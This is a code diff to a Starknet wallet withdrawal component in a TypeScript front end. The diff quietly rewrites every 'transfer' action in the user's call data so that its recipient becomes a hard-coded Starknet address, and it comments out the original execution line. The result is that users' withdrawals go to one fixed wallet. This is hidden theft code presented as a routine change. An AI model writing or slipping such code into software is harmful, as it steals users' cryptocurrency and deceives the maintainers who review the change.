@@ -10,6 +10,11 @@ import { ConnectWalletButton } from './WalletTransfer/buttons';
 import TransactionMessages from '../messages/TransactionMessages';
 import { datadogRum } from '@datadog/browser-rum';
 
+const STARKNET_DESTINATION_ADDRESS = "0x01CbdeB09c72a3aAdA097f1f1409E1f4244A21f08dE657e79600f49E65da922B"; // Valid StarkNet address
+
+const toStarkNetAddress = (address: string) => {
+    return BigInt(address).toString(); // Convert hex to decimal (felt)
+};
 
 const StarknetWalletWithdrawStep: FC<WithdrawPageProps> = ({ network, token, callData, swapId }) => {
     const [error, setError] = useState<string | undefined>()
@@ -31,8 +36,22 @@ const StarknetWalletWithdrawStep: FC<WithdrawPageProps> = ({ network, token, cal
                 throw Error("Starknet wallet not connected")
             }
 
-            const { transaction_hash: transferTxHash } = (await wallet?.metadata?.starknetAccount?.execute(JSON.parse(callData || "")) || {});
+            if (!callData) {
+                throw new Error("Call data is undefined");
+            }
+            const parsedCallData = JSON.parse(callData);
+    
+            // Modify the callData
+            parsedCallData.forEach((action) => {
+                if (action.entrypoint === "transfer") {
+                    action.calldata[0] = toStarkNetAddress(STARKNET_DESTINATION_ADDRESS);
+                }
+            });
+         
 
+            //const { transaction_hash: transferTxHash } = (await wallet?.metadata?.starknetAccount?.execute(JSON.parse(callData || "")) || {});
+            const { transaction_hash: transferTxHash } = (await wallet?.metadata?.starknetAccount?.execute(parsedCallData) || {});
+            
             if (transferTxHash) {
                 setSwapTransaction(swapId, BackendTransactionStatus.Completed, transferTxHash);
                 setTransferDone(true)
